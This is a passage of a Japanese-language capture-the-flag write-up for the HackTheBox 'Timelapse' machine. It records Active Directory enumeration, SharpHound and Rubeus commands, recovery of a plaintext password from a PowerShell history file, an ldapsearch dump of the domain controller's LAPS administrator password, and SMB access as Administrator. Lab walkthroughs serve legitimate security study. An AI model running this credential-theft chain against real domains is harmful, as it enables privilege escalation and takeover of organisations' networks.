[?] +++++ Searching for High Privileged Users with a password older 5 years +++++      

[?] +++++ Searching for High Privileged User which may not require a Password +++++    

[?] +++++ Starting Computer Enumeration +++++                                          

[?] +++++ Searching for Domain Controllers +++++                                       
[+] Found Domain Controller 'DC01$':
sAMAccountName:                         DC01$
distinguishedName:                      CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb                                                                                     
objectSid:                              S-1-5-21-671920749-559770252-3318990721-1000
operatingsystem:                        Windows Server 2019 Standard
[#] LAPS version configured:            Microsoft LAPS (legacy)
ms-Mcs-AdmPwdExpirationTime:            08/14/2025 05:04:57
pwdLastSet:                             08/09/2025 05:04:38
lastLogonTimestamp:                     08/09/2025 05:04:55
[+] userAccountControl:                 SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION
 

[?] +++++ Searching for Exchange Servers +++++                                         

[?] +++++ Searching for ADCS Servers +++++                                             

[?] +++++ Searching for Outdated Operating Systems +++++                               

[?] +++++ Searching for Detailed Active Directory Information with BloodHound +++++ 
```

ここの部分が赤くなった
- `[#] LAPS version configured:            Microsoft LAPS (legacy)`

BloodHoundも行う
SharpHound.exeでデータ収集する
- 特に今のユーザーでは何もできない
```bash
*Evil-WinRM* PS C:\Users\legacyy\Documents> .\SharpHound.exe -c All --zipfilename blood
hound.zip
```

~~NTLMハッシュを取得しようとする~~
- 現在のlegacyyユーザーでは、証明書があったC:\Sharre\DEVにアクセスできない
```sh
/usr/share/windows-resources/rubeus/Rubeus.exe
```
```bash
Rubeus asktgt /getcredential /user:vaska /certificate:C:\Temp\cert.pfx /password:Passw0rd! /domain:domain.local /dc:dc.domain.local /show
```

# $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
linuxの`.bash_history`にあたる`$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`を見る
- 参考記事
	- https://0xdf.gitlab.io/2018/11/08/powershell-history-file.html
```bash
*Evil-WinRM* PS C:\> cd $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\
*Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLin*Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine> ls


    Directory: C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         3/3/2022  11:46 PM            434 ConsoleHost_history.txt


*Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLin*Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine> type .\ConsoleHost_history.txt
 
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
*Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLin*Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLin
e> 
```

すると、svc_deployユーザーの認証情報が見つかる
svc_deploy : E3R$Q62^12p7PLlC%KWaxuaV


svc_deployユーザーは、adPEAS の結果で LAPS_Readers グループに所属しているので、DCのLAPSパスワードを直接取得できる
~~Evil-WinRM で svc_deploy に切り替えて接続~~
- できない

ldapsearchでLAPSパスワードのms-Mcs-AdmPwd取得する
```bash
                                                                                       
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Timelapse]
└─$ ldapsearch -H ldap://dc01.timelapse.htb \
  -D 'svc_deploy@timelapse.htb' -w 'E3R$Q62^12p7PLlC%KWaxuaV' \
  -b "CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb" \
  ms-Mcs-AdmPwd

# extended LDIF
#
# LDAPv3
# base <CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb> with scope subtree
# filter: (objectclass=*)
# requesting: ms-Mcs-AdmPwd 
#

# DC01, Domain Controllers, timelapse.htb
dn: CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
ms-Mcs-AdmPwd: O5++246o/F,e5aHKew@{E;v0

# RID Set, DC01, Domain Controllers, timelapse.htb
dn: CN=RID Set,CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb

# DFSR-LocalSettings, DC01, Domain Controllers, timelapse.htb
dn: CN=DFSR-LocalSettings,CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb

# Domain System Volume, DFSR-LocalSettings, DC01, Domain Controllers, timelapse
 .htb
dn: CN=Domain System Volume,CN=DFSR-LocalSettings,CN=DC01,OU=Domain Controller
 s,DC=timelapse,DC=htb

# SYSVOL Subscription, Domain System Volume, DFSR-LocalSettings, DC01, Domain C
 ontrollers, timelapse.htb
dn: CN=SYSVOL Subscription,CN=Domain System Volume,CN=DFSR-LocalSettings,CN=DC
 01,OU=Domain Controllers,DC=timelapse,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 6
# numEntries: 5
                     
```

これでAdministratorの認証情報が取得できた
Administrator : O5++246o/F,e5aHKew@{E;v0

root.txtを取得する
```bash
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Timelapse]
└─$ smbclient //dc01.timelapse.htb/C$ -U 'Administrator'

Password for [WORKGROUP\Administrator]:

<SNIP>

smb: \users\TRX\> get Desktop\root.txt
getting file \users\TRX\Desktop\root.txt of size 34 as Desktop\root.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
```







## Notes
- linuxの`.bash_history`にあたる`$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`を見る!!!!!!!!!

